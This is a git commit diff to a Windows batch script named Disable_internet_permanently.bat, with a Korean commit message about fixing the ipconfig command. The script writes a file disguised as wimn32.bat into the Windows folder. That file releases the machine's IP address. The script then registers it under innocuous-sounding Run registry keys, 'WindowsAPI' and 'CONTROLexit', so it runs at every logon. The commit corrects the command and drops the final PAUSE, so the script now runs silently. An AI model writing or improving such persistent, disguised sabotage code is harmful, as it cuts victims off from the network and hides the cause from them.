8c075450533d058ad2ed00d3704c33bde3b3a763
조세영 | Jo Seyeong <6127878@naver.com>
2024-10-01 11:36:52 +0900

    ipconfig 명령어 수정

--- Disable_internet_permanently.bat
+++ Disable_internet_permanently.bat
@@ -2,10 +2,8 @@
 @echo off
 echo @echo off >> c:\windows\wimn32.bat
 echo break off >> c:\windows\wimn32.bat
-echo ipconfig/release_all>>c:\windows\wimn32.bat
+echo ipconfig /release>>c:\windows\wimn32.bat
 echo end >> c:\windows\wimn32.bat
 
 reg add hkey_local_machine\software\microsoft\windows\currentversion\run /v WindowsAPI /t reg_sz /d c:\windows\wimn32.bat /f
 reg add hkey_current_user\software\microsoft\windows\currentversion\run /v CONTROLexit /t reg_sz /d c:\windows\wimn32.bat /f
-
-PAUSE
